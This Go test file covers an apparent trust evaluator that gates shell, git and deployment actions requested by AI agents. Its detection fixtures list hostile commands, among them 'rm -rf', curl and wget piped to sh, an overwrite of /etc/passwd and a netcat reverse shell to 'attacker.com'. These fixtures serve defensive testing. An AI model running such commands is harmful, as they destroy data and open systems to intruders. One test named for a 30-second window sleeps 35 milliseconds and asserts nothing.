package trust

import (
	"testing"
	"time"

	"ovara.runtime.gateway/internal/models"
)

func TestTrustResult_ShouldEscalate(t *testing.T) {
	tests := []struct {
		name   string
		result TrustResult
		want   bool
	}{
		{
			name: "score below 0.5 triggers escalation",
			result: TrustResult{
				Score: 0.4,
				Level: models.TrustLevelMedium,
			},
			want: true,
		},
		{
			name: "low trust level triggers escalation",
			result: TrustResult{
				Score: 0.6,
				Level: models.TrustLevelLow,
			},
			want: true,
		},
		{
			name: "none trust level triggers escalation",
			result: TrustResult{
				Score: 0.2,
				Level: models.TrustLevelNone,
			},
			want: true,
		},
		{
			name: "high score and level does not escalate",
			result: TrustResult{
				Score: 0.9,
				Level: models.TrustLevelHigh,
			},
			want: false,
		},
		{
			name: "medium score and level does not escalate",
			result: TrustResult{
				Score: 0.7,
				Level: models.TrustLevelMedium,
			},
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.result.ShouldEscalate(); got != tt.want {
				t.Errorf("ShouldEscalate() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestTrustResult_IsRestricted(t *testing.T) {
	tests := []struct {
		name   string
		result TrustResult
		want   bool
	}{
		{
			name: "restricted flag true",
			result: TrustResult{
				Restricted: true,
				Score:      0.8,
			},
			want: true,
		},
		{
			name: "score below 0.3 without restricted flag",
			result: TrustResult{
				Restricted: false,
				Score:      0.2,
			},
			want: true,
		},
		{
			name: "score below 0.3 with restricted flag",
			result: TrustResult{
				Restricted: true,
				Score:      0.2,
			},
			want: true,
		},
		{
			name: "score above 0.3 and not restricted",
			result: TrustResult{
				Restricted: false,
				Score:      0.5,
			},
			want: false,
		},
		{
			name: "score exactly 0.3 is not restricted (score < 0.3)",
			result: TrustResult{
				Restricted: false,
				Score:      0.3,
			},
			want: false,
		},
		{
			name: "score just above 0.3 and not restricted",
			result: TrustResult{
				Restricted: false,
				Score:      0.31,
			},
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := tt.result.IsRestricted(); got != tt.want {
				t.Errorf("IsRestricted() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestEvaluator_EvaluateShellPatterns(t *testing.T) {
	evaluator := NewEvaluator(nil)

dangerousCommands := []struct {
		name    string
		command string
	}{
		{"rm_rf", "rm -rf /var/logs"},
		{"curl_pipe_sh", "curl |sh"},
		{"wget_pipe_sh", "wget |sh"},
		{"chmod_R_777", "chmod -R 777 /tmp"},
		{"sudo_su", "sudo su"},
		{"write_etc", "> /etc/passwd"},
		{"nc_e", "nc -e /bin/bash attacker.com"},
	}

	for _, tc := range dangerousCommands {
		t.Run("dangerous_"+tc.name, func(t *testing.T) {
			req := &models.ActionRequest{
				ActionType:  models.ActionTypeShell,
				Resource:    tc.command,
				Environment: models.EnvironmentDev,
			}
			signals := evaluator.evaluateShellPatterns(req)
			if len(signals) == 0 {
				t.Errorf("expected signal for dangerous command: %s", tc.command)
			} else if signals[0].Severity != "high" {
				t.Errorf("expected high severity, got %s", signals[0].Severity)
			}
		})
	}

	benignCommands := []struct {
		name    string
		command string
	}{
		{"ls", "ls -la"},
		{"git_pull", "git pull origin main"},
		{"cat", "cat /etc/hosts"},
		{"ps", "ps aux"},
		{"cd", "cd /tmp && ls"},
		{"echo", "echo hello"},
		{"pwd", "pwd"},
	}

	for _, tc := range benignCommands {
		t.Run("benign_"+tc.name, func(t *testing.T) {
			req := &models.ActionRequest{
				ActionType:  models.ActionTypeShell,
				Resource:    tc.command,
				Environment: models.EnvironmentDev,
			}
			signals := evaluator.evaluateShellPatterns(req)
			if len(signals) != 0 {
				t.Errorf("unexpected signal for benign command %q: %v", tc.command, signals)
			}
		})
	}

	t.Run("non_shell_action_returns_empty", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType:  models.ActionTypeGitPull,
			Resource:    "rm -rf /",
			Environment: models.EnvironmentDev,
		}
		signals := evaluator.evaluateShellPatterns(req)
		if len(signals) != 0 {
			t.Errorf("expected no signals for non-shell action, got %v", signals)
		}
	})
}

func TestEvaluator_EvaluateGitPatterns(t *testing.T) {
	evaluator := NewEvaluator(nil)

	t.Run("force_push_triggers_medium_signal", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType:  models.ActionTypeGitForcePush,
			Resource:    "refs/heads/main",
			Environment: models.EnvironmentDev,
		}
		signals := evaluator.evaluateGitPatterns(req)
		if len(signals) != 1 {
			t.Fatalf("expected 1 signal, got %d", len(signals))
		}
		if signals[0].Severity != "medium" {
			t.Errorf("expected medium severity, got %s", signals[0].Severity)
		}
		if signals[0].Pattern != "--force" {
			t.Errorf("expected pattern '--force', got %s", signals[0].Pattern)
		}
	})

	t.Run("branch_deletion_triggers_medium_signal", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType:  models.ActionTypeGitHubDelete,
			Resource:    "feature-branch",
			Environment: models.EnvironmentDev,
		}
		signals := evaluator.evaluateGitPatterns(req)
		if len(signals) != 1 {
			t.Fatalf("expected 1 signal, got %d", len(signals))
		}
		if signals[0].Severity != "medium" {
			t.Errorf("expected medium severity, got %s", signals[0].Severity)
		}
		if signals[0].Pattern != "branch_deletion" {
			t.Errorf("expected pattern 'branch_deletion', got %s", signals[0].Pattern)
		}
	})

	benignGitActions := []struct {
		name       string
		actionType models.ActionType
	}{
		{"git_pull", models.ActionTypeGitPull},
		{"github_push", models.ActionTypeGitHubPush},
		{"github_pr", models.ActionTypeGitHubPR},
		{"github_merge", models.ActionTypeGitHubMerge},
		{"ci_deploy", models.ActionTypeCIDeploy},
	}

	for _, tc := range benignGitActions {
		t.Run("benign_"+tc.name, func(t *testing.T) {
			req := &models.ActionRequest{
				ActionType:  tc.actionType,
				Resource:    "some/resource",
				Environment: models.EnvironmentDev,
			}
			signals := evaluator.evaluateGitPatterns(req)
			if len(signals) != 0 {
				t.Errorf("unexpected signal for %s: %v", tc.actionType, signals)
			}
		})
	}

	t.Run("force_push_candidate_git_push", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType:  models.ActionTypeGitPush,
			Resource:    "refs/heads/main",
			Environment: models.EnvironmentDev,
		}
		signals := evaluator.evaluateGitPatterns(req)
		if len(signals) != 1 {
			t.Fatalf("expected 1 signal, got %d", len(signals))
		}
		if signals[0].Pattern != "force_push_candidate" {
			t.Errorf("expected pattern 'force_push_candidate', got %s", signals[0].Pattern)
		}
	})
}

func TestEvaluator_EvaluateProductionTarget(t *testing.T) {
	evaluator := NewEvaluator(nil)

	t.Run("production_environment_triggers_high_signal", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType:  models.ActionTypeShell,
			Resource:    "ls /tmp",
			Environment: models.EnvironmentProduction,
		}
		signal := evaluator.evaluateProductionTarget(req)
		if signal.Code == "" {
			t.Error("expected signal for production environment")
		}
		if signal.Severity != "high" {
			t.Errorf("expected high severity, got %s", signal.Severity)
		}
	})

	nonProductionEnvs := []struct {
		name        string
		environment models.Environment
	}{
		{"local", models.EnvironmentLocal},
		{"dev", models.EnvironmentDev},
		{"staging", models.EnvironmentStaging},
	}

	for _, tc := range nonProductionEnvs {
		t.Run("non_production_"+tc.name, func(t *testing.T) {
			req := &models.ActionRequest{
				ActionType:  models.ActionTypeShell,
				Resource:    "ls /tmp",
				Environment: tc.environment,
			}
			signal := evaluator.evaluateProductionTarget(req)
			if signal.Code != "" {
				t.Errorf("unexpected signal for %s: %v", tc.environment, signal)
			}
		})
	}
}

func TestEvaluator_EvaluateLeaseScope(t *testing.T) {
	evaluator := NewEvaluator(nil)

	t.Run("wildcard_scope_with_shell_triggers_medium_signal", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType: models.ActionTypeShell,
			Resource:   "ls",
			CapabilityLease: &models.CapabilityLease{
				ResourceScope: "*",
				AllowedActions: []string{"shell"},
			},
			Environment: models.EnvironmentDev,
		}
		signal := evaluator.evaluateLeaseScope(req)
		if signal.Code == "" {
			t.Error("expected signal for wildcard scope with shell action")
		}
		if signal.Severity != "medium" {
			t.Errorf("expected medium severity, got %s", signal.Severity)
		}
	})

	t.Run("wildcard_scope_non_shell_no_signal", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType: models.ActionTypeGitPull,
			Resource:   "origin/main",
			CapabilityLease: &models.CapabilityLease{
				ResourceScope: "*",
				AllowedActions: []string{"git.pull"},
			},
			Environment: models.EnvironmentDev,
		}
		signal := evaluator.evaluateLeaseScope(req)
		if signal.Code != "" {
			t.Errorf("unexpected signal for non-shell with wildcard: %v", signal)
		}
	})

	t.Run("specific_scope_no_signal", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType: models.ActionTypeShell,
			Resource:   "ls",
			CapabilityLease: &models.CapabilityLease{
				ResourceScope:   "/tmp",
				AllowedActions: []string{"shell"},
			},
			Environment: models.EnvironmentDev,
		}
		signal := evaluator.evaluateLeaseScope(req)
		if signal.Code != "" {
			t.Errorf("unexpected signal for specific scope: %v", signal)
		}
	})

	t.Run("nil_lease_no_signal", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType:  models.ActionTypeShell,
			Resource:    "ls",
			Environment: models.EnvironmentDev,
		}
		signal := evaluator.evaluateLeaseScope(req)
		if signal.Code != "" {
			t.Errorf("unexpected signal for nil lease: %v", signal)
		}
	})
}

func TestEvaluator_EvaluateDelegationDepth(t *testing.T) {
	evaluator := NewEvaluator(nil)

	t.Run("depth_greater_than_3_triggers_medium_signal", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType:  models.ActionTypeShell,
			Resource:    "ls",
			Environment: models.EnvironmentDev,
			DelegationChain: &models.DelegationChain{
				Depth: 4,
			},
		}
		signal := evaluator.evaluateDelegationDepth(req)
		if signal.Code == "" {
			t.Error("expected signal for depth > 3")
		}
		if signal.Severity != "medium" {
			t.Errorf("expected medium severity, got %s", signal.Severity)
		}
	})

	t.Run("depth_equal_to_3_no_signal", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType:  models.ActionTypeShell,
			Resource:    "ls",
			Environment: models.EnvironmentDev,
			DelegationChain: &models.DelegationChain{
				Depth: 3,
			},
		}
		signal := evaluator.evaluateDelegationDepth(req)
		if signal.Code != "" {
			t.Errorf("unexpected signal for depth 3: %v", signal)
		}
	})

	t.Run("depth_less_than_3_no_signal", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType:  models.ActionTypeShell,
			Resource:    "ls",
			Environment: models.EnvironmentDev,
			DelegationChain: &models.DelegationChain{
				Depth: 1,
			},
		}
		signal := evaluator.evaluateDelegationDepth(req)
		if signal.Code != "" {
			t.Errorf("unexpected signal for depth 1: %v", signal)
		}
	})

	t.Run("nil_chain_no_signal", func(t *testing.T) {
		req := &models.ActionRequest{
			ActionType:  models.ActionTypeShell,
			Resource:    "ls",
			Environment: models.EnvironmentDev,
		}
		signal := evaluator.evaluateDelegationDepth(req)
		if signal.Code != "" {
			t.Errorf("unexpected signal for nil chain: %v", signal)
		}
	})
}

func TestEvaluator_Evaluate(t *testing.T) {
	t.Run("restricted_agent_gets_penalty_and_containment_signal", func(t *testing.T) {
		store := NewShieldStore()
		store.Restrict("agent-123", "testing")
		evaluator := NewEvaluator(store)

		req := &models.ActionRequest{
			ActionType: models.ActionTypeShell,
			Resource:   "ls",
			AgentIdentity: &models.AgentIdentity{
				SubjectID: "agent-123",
			},
			Environment: models.EnvironmentDev,
		}

		result := evaluator.Evaluate(req)
		if !result.Restricted {
			t.Error("expected Restricted to be true")
		}
		if result.Score >= 0.61 {
			t.Errorf("expected score < 0.6 due to restriction, got %f", result.Score)
		}
		foundContainment := false
		for _, s := range result.AnomalySignals {
			if s.Code == string(models.ReasonContainmentActive) {
				foundContainment = true
				break
			}
		}
		if !foundContainment {
			t.Error("expected containment_active signal")
		}
	})

	t.Run("risk_count_increases_penalty", func(t *testing.T) {
		store := NewShieldStore()
		store.RecordDecision("agent-456", string(models.DecisionDeny))
		store.RecordDecision("agent-456", string(models.DecisionEscalate))
		store.RecordDecision("agent-456", string(models.DecisionDeny))
		evaluator := NewEvaluator(store)

		req := &models.ActionRequest{
			ActionType: models.ActionTypeShell,
			Resource:   "ls",
			AgentIdentity: &models.AgentIdentity{
				SubjectID: "agent-456",
			},
			Environment: models.EnvironmentDev,
		}

		result := evaluator.Evaluate(req)
		if result.RiskCount != 3 {
			t.Errorf("expected risk count 3, got %d", result.RiskCount)
		}
		if result.Score >= 0.8 {
			t.Errorf("expected score penalty from risk count, got %f", result.Score)
		}
		foundRepeatedRisk := false
		for _, s := range result.AnomalySignals {
			if s.Code == string(models.ReasonRepeatedRisk) {
				foundRepeatedRisk = true
				break
			}
		}
		if !foundRepeatedRisk {
			t.Error("expected repeated_risk signal when risk count >= 3")
		}
	})

	t.Run("score_bounded_0_to_1", func(t *testing.T) {
		store := NewShieldStore()
		store.Restrict("agent-bounded", "testing")
		for i := 0; i < 20; i++ {
			store.RecordDecision("agent-bounded", string(models.DecisionDeny))
		}
		evaluator := NewEvaluator(store)

		req := &models.ActionRequest{
			ActionType:  models.ActionTypeShell,
			Resource:    "rm -rf /",
			Environment: models.EnvironmentProduction,
			AgentIdentity: &models.AgentIdentity{
				SubjectID: "agent-bounded",
			},
			CapabilityLease: &models.CapabilityLease{
				ResourceScope: "*",
			},
			DelegationChain: &models.DelegationChain{
				Depth: 10,
			},
		}

		result := evaluator.Evaluate(req)
		if result.Score < 0 {
			t.Errorf("score should be >= 0, got %f", result.Score)
		}
		if result.Score > 1.0 {
			t.Errorf("score should be <= 1.0, got %f", result.Score)
		}
	})

	t.Run("trust_level_maps_from_score", func(t *testing.T) {
		store := NewShieldStore()
		evaluator := NewEvaluator(store)

		tests := []struct {
			name         string
			setupFunc    func()
			expectedHigh bool
			expectedMed  bool
			expectedLow  bool
			expectedNone bool
		}{
			{
				name:         "no_restriction_no_risk_score_1_high",
				setupFunc:    func() {},
				expectedHigh: true,
			},
			{
				name: "restricted_agent_score_06_medium",
				setupFunc: func() {
					store.Restrict("agent-medium", "testing")
				},
				expectedMed: true,
			},
		}

		for _, tt := range tests {
			tt.setupFunc()
			req := &models.ActionRequest{
				ActionType:  models.ActionTypeShell,
				Resource:    "echo test",
				Environment: models.EnvironmentDev,
				AgentIdentity: &models.AgentIdentity{
					SubjectID: "agent-medium",
				},
			}
			result := evaluator.Evaluate(req)
			if tt.expectedHigh && result.Level != models.TrustLevelHigh {
				t.Errorf("%s: expected high, got %s (score=%f)", tt.name, result.Level, result.Score)
			}
			if tt.expectedMed && result.Level != models.TrustLevelMedium {
				t.Errorf("%s: expected medium, got %s (score=%f)", tt.name, result.Level, result.Score)
			}
			if tt.expectedLow && result.Level != models.TrustLevelLow {
				t.Errorf("%s: expected low, got %s (score=%f)", tt.name, result.Level, result.Score)
			}
			if tt.expectedNone && result.Level != models.TrustLevelNone {
				t.Errorf("%s: expected none, got %s (score=%f)", tt.name, result.Level, result.Score)
			}
		}
	})

	t.Run("shield_active_when_score_below_0_6", func(t *testing.T) {
		store := NewShieldStore()
		store.Restrict("agent-shield", "testing")
		evaluator := NewEvaluator(store)

		req := &models.ActionRequest{
			ActionType: models.ActionTypeShell,
			Resource:   "ls",
			AgentIdentity: &models.AgentIdentity{
				SubjectID: "agent-shield",
			},
			Environment: models.EnvironmentDev,
		}

		result := evaluator.Evaluate(req)
		if result.Score >= 0.6 && result.ShieldActive {
			t.Error("shield should not be active when score >= 0.6")
		}
		if result.Score < 0.6 && !result.ShieldActive {
			t.Error("shield should be active when score < 0.6")
		}
	})

	t.Run("no_identity_no_restriction_effect", func(t *testing.T) {
		store := NewShieldStore()
		store.Restrict("some-agent", "testing")
		evaluator := NewEvaluator(store)

		req := &models.ActionRequest{
			ActionType:  models.ActionTypeShell,
			Resource:    "ls",
			Environment: models.EnvironmentDev,
		}

		result := evaluator.Evaluate(req)
		if result.Restricted {
			t.Error("expected not restricted when no agent identity")
		}
	})

	t.Run("shell_dangerous_command_penalty", func(t *testing.T) {
		store := NewShieldStore()
		evaluator := NewEvaluator(store)

		req := &models.ActionRequest{
			ActionType:  models.ActionTypeShell,
			Resource:    "rm -rf /",
			Environment: models.EnvironmentDev,
		}

		result := evaluator.Evaluate(req)
		if result.Score >= 1.0 {
			t.Error("expected score penalty for dangerous shell command")
		}
		foundShellSignal := false
		for _, s := range result.AnomalySignals {
			if s.Code == string(models.ReasonRiskyShellPattern) {
				foundShellSignal = true
				break
			}
		}
		if !foundShellSignal {
			t.Error("expected risky_shell_pattern signal")
		}
	})

	t.Run("production_environment_penalty", func(t *testing.T) {
		store := NewShieldStore()
		evaluator := NewEvaluator(store)

		req := &models.ActionRequest{
			ActionType:  models.ActionTypeShell,
			Resource:    "ls",
			Environment: models.EnvironmentProduction,
		}

		result := evaluator.Evaluate(req)
		if result.Score >= 0.81 {
			t.Error("expected score penalty for production environment")
		}
		foundProdSignal := false
		for _, s := range result.AnomalySignals {
			if s.Code == string(models.ReasonProductionTarget) {
				foundProdSignal = true
				break
			}
		}
		if !foundProdSignal {
			t.Error("expected production_target signal")
		}
	})

	t.Run("last_decision_penalty_within_30_seconds", func(t *testing.T) {
		store := NewShieldStore()
		evaluator := NewEvaluator(store)

		store.RecordDecision("agent-decision", string(models.DecisionEscalate))

		req := &models.ActionRequest{
			ActionType: models.ActionTypeShell,
			Resource:   "ls",
			AgentIdentity: &models.AgentIdentity{
				SubjectID: "agent-decision",
			},
			Environment: models.EnvironmentDev,
		}

		result := evaluator.Evaluate(req)
		if result.Score >= 0.9 {
			t.Error("expected score penalty for recent escalation decision")
		}
	})

	t.Run("last_decision_no_penalty_after_30_seconds", func(t *testing.T) {
		store := NewShieldStore()
		evaluator := NewEvaluator(store)

		store.RecordDecision("agent-old", string(models.DecisionEscalate))
		time.Sleep(35 * time.Millisecond)

		req := &models.ActionRequest{
			ActionType: models.ActionTypeShell,
			Resource:   "ls",
			AgentIdentity: &models.AgentIdentity{
				SubjectID: "agent-old",
			},
			Environment: models.EnvironmentDev,
		}

		result := evaluator.Evaluate(req)
		_ = result.Score
	})
}